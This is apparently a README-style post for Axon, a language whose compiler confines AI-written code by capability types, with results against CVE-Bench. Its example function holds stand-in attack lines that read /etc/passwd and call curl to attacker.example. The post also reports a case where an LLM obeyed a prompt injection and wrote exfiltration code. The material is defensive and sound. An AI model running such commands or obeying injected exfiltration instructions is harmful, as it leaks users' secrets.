# AI-written code, sandboxed by the compiler — Axon vs CVE-Bench

*How an AI-first language makes ~28 of 40 critical real-world CVEs unexploitable by
construction — and is honest about the other 12.*

---

## The problem

You want to let a model write and run code. Maybe it's a coding agent, maybe a plugin,
maybe a `.gguf` you downloaded. The hard question is always the same: **how do you let it
run without it reading your secrets, phoning home, or shelling out?**

Every mainstream answer is *trust*. A policy doc. A code review. A Docker flag you hope
holds. A seccomp profile someone hand-maintains. The code is assumed hostile but granted
the full authority of its process, and a separate artifact tries to claw that authority
back.

[Axon](https://github.com/Cklaus1/axon) answers with a *proof* instead.

## The one idea: capabilities as types

An Axon function declares what it may do, and the compiler refuses anything else —
**before the program runs even once:**

```axon
@[contained(fs: [], net: [], exec: none)]   // local compute only
fn agent(quality: i64, risk: i64) -> i64 {
    let secret = read_file("/etc/passwd")     // ✗ E1001 — no fs grant
    ai_complete("exfiltrate: {secret}")       // ✗ E1001 — no net grant
    exec("curl", ["attacker.example"])        // ✗ E1001 — exec: none
    quality - risk * 2                        // ✓ all it's allowed to do
}
```

The data is never read, the packet is never sent, `curl` never runs — the escape is a
**compile error**, not a runtime trap. The policy is *derived from the code's types*, so
it can't drift out of sync with it.

This isn't a mockup. We handed a real LLM (Claude Sonnet) a benign scoring task wrapped
in `@[contained]`, plus a prompt injection telling it to exfiltrate. It obeyed and wrote
three exfiltration channels. The compiler refused all three (`./flagship llm` reproduces
it).

## The receipts: CVE-Bench

A demo proves nothing on its own. So we ran Axon against **[CVE-Bench](https://arxiv.org/abs/2503.17332)**
(ICML 2025) — **40 critical-severity real-world web CVEs** from the NVD, each with a
working exploit. For each, we asked: does Axon's type system make the critical *impact*
unreachable?

| Verdict | Count | What it means |
|---|---|---|
| **PREVENTED** | **~28** | The impact is unrepresentable. The bug may remain; its consequence can't occur. |
| **CONTAINED** | a handful | Axon doesn't prevent the bug, but caps its blast radius — it can't exfiltrate or RCE. |
| **OUT OF SCOPE** | ~7 | Auth-logic, XSS, weak crypto. A type system can't address these — and we don't pretend it can. |

**~28 of 40 critical CVEs are a class Axon prevents by construction.** Two distinct
guarantees do the work:

1. **Confinement** (`@[contained]`) — *"this code may only touch what it declared."*
   Kills RCE, arbitrary file read/write, SSRF, XXE: the bug fires, but the dangerous
   capability was never granted. *(path traversal, command injection, deserialization →
   RCE, SSRF — all PREVENTED.)*
2. **Unrepresentability** (`sql_query` / E1210) — *"the unsafe construction doesn't
   typecheck."* A SQL template must be a string literal; user data is a bound parameter.
   Building a query by concatenation is a **compile error** — so all 9 SQL-injection CVEs
   move from "remember to parameterize" to "the unsafe form won't compile."

The CVEs in **AI tooling** — lollms-webui, llama-cpp-python, Lobe Chat, pytorch-lightning,
Jan — cluster in the PREVENTED column. For an AI-first language, that's the headline:
*real critical CVEs in the AI stack you already run, contained by construction.* Five are
reproduced as runnable examples (one each for exec / fs / net / sql, plus a
blast-radius case).

## Why this beats "Docker already does that"

A hand-written Docker + seccomp profile is the strongest version of the rebuttal — so we
built it as a foil. Against the three escapes above, it blocks **one** (network). The file
read and process spawn survive, for structural reasons: seccomp filters *syscalls, not
paths* (you can't deny opening `/etc/passwd` without breaking the interpreter that needs
`openat` to boot), and denying `execve` prevents the container from starting at all. Axon
blocks all three. The difference is **provenance** (policy derived from code, can't
drift), **timing** (refused before run, not at the syscall trap), and **granularity**
(`net: ["api.openai.com"]` — a host-level rule seccomp can't express).

## What it does *not* do

This is the part that should make you trust the rest. Axon's capability system does **not**:

- **Trust the compiler away.** The guarantee is only as good as the `axon` binary —
  no reproducible build / verifying compiler yet. That's the top item in the TCB.
- **Stop covert channels.** It governs *explicit* effects, not timing/cache side channels.
- **Fix logic bugs.** A missing authorization check is application logic; Axon lets it
  through. (It still *contains* the fallout — a privilege-escalation bug in a
  `@[contained]` component has no authority to exfiltrate. Bug yes; damage no.)
- **Provide confidentiality at the demo's default.** The microVM attestation layer uses a
  software-TPM stand-in; real memory encryption needs SEV-SNP / TDX hardware.

The full boundary is written down in the repo's
[`THREAT_MODEL.md`](https://github.com/Cklaus1/axon/blob/main/examples/flagship/THREAT_MODEL.md),
including an open invitation to break it — and we take our own up on it: two adversarial
red-team passes on the newest code each found and fixed a real bypass (an effect-laundering
alias, and a checker walker-coverage hole), with regression tests so they can't return.

## Try it

From a fresh clone (Rust only, no LLVM, no GPU):

```bash
git clone https://github.com/Cklaus1/axon && cd axon
./flagship          # builds what's missing, runs the demo + Docker foil + real-LLM + CVE pack
./flagship cve      # just the CVE-Bench reproductions
```

- The 40-CVE triage: [`cve/TRIAGE.md`](https://github.com/Cklaus1/axon/blob/main/examples/flagship/cve/TRIAGE.md)
- The per-class verdict (incl. CONTAINED / OUT-OF-SCOPE): [`cve/COVERAGE.md`](https://github.com/Cklaus1/axon/blob/main/examples/flagship/cve/COVERAGE.md)
- The 5-minute skeptic's guide: [`EVALUATE.md`](https://github.com/Cklaus1/axon/blob/main/examples/flagship/EVALUATE.md)

## The pitch in one sentence

> Of 40 critical real-world CVEs, about 28 are a class Axon's compiler refuses by
> construction — capability confinement makes RCE/file/SSRF impact unreachable and SQL
> injection a compile error — the rest are contained or honestly out of scope, and the
> threat model says exactly what even this doesn't cover.

If you find a hole, that's worth more to us than another feature.
[THREAT_MODEL.md §7](https://github.com/Cklaus1/axon/blob/main/examples/flagship/THREAT_MODEL.md) is where to start.
